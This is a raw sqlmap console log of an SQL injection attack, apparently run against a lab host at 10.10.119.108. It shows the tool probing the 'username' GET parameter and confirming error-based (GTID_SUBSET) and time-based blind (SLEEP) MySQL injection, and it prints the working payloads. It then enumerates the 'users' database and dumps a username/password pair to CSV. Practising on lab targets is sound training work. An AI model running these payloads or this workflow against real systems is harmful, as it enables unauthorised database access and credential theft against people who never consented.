        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.8#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:03:44 /2020-09-14/

[18:03:44] [WARNING] provided value for parameter 'username' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[18:03:44] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[18:03:44] [INFO] resuming back-end DBMS 'mysql' 
[18:03:44] [INFO] testing connection to the target URL
[18:03:45] [INFO] testing if the target URL content is stable
[18:03:45] [INFO] target URL content is stable
[18:03:45] [INFO] testing if GET parameter 'username' is dynamic
[18:03:45] [WARNING] GET parameter 'username' does not appear to be dynamic
[18:03:45] [INFO] heuristic (basic) test shows that GET parameter 'username' might be injectable (possible DBMS: 'MySQL')
[18:03:46] [INFO] heuristic (XSS) test shows that GET parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[18:03:46] [INFO] testing for SQL injection on GET parameter 'username'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[18:03:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:03:51] [WARNING] reflective value(s) found and filtering out
[18:03:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:03:53] [INFO] testing 'Generic inline queries'
[18:03:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:04:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:04:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:04:21] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:04:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:04:56] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:05:10] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:05:28] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:05:42] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[18:05:59] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[18:06:15] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:06:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:06:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:06:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:06:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:06:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:06:18] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:06:19] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:06:20] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:06:20] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:06:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:06:30] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:06:30] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:06:42] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:06:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:07:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:07:15] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[18:07:16] [INFO] GET parameter 'username' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[18:07:16] [INFO] testing 'MySQL inline queries'
[18:07:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:07:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:07:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[18:07:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:07:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[18:07:18] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[18:07:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:07:29] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[18:07:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:07:29] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[18:07:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:07:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:07:30] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[18:07:45] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[18:07:49] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[18:08:02] [INFO] testing 'MySQL UNION query (75) - 21 to 40 columns'
[18:08:06] [INFO] testing 'MySQL UNION query (75) - 41 to 60 columns'
[18:08:10] [INFO] testing 'MySQL UNION query (75) - 61 to 80 columns'
[18:08:15] [INFO] testing 'MySQL UNION query (75) - 81 to 100 columns'
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 1093 HTTP(s) requests:
---
Parameter: username (GET)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=' AND GTID_SUBSET(CONCAT(0x716b7a7871,(SELECT (ELT(4489=4489,1))),0x7176707871),4489)-- AuDl&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=' AND (SELECT 3005 FROM (SELECT(SLEEP(5)))dThk)-- AtKo&password=
---
[18:08:25] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[18:08:25] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[18:08:25] [INFO] fetching current database
[18:08:25] [INFO] resumed: 'users'
[18:08:25] [INFO] fetching tables for database: 'users'
[18:08:25] [INFO] retrieved: 'users'
[18:08:25] [INFO] fetching columns for table 'users' in database 'users'
[18:08:26] [INFO] retrieved: 'username'
[18:08:26] [INFO] retrieved: 'varchar(100)'
[18:08:26] [INFO] retrieved: 'password'
[18:08:26] [INFO] retrieved: 'varchar(100)'
[18:08:27] [INFO] fetching entries for table 'users' in database 'users'
[18:08:27] [INFO] retrieved: 'secretpass'
[18:08:27] [INFO] retrieved: 'pingudad'
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+

[18:08:27] [INFO] table 'users.users' dumped to CSV file '/home/neeraj/.local/share/sqlmap/output/10.10.119.108/dump/users/users.csv'
[18:08:27] [INFO] fetched data logged to text files under '/home/neeraj/.local/share/sqlmap/output/10.10.119.108'

[*] ending @ 18:08:27 /2020-09-14/

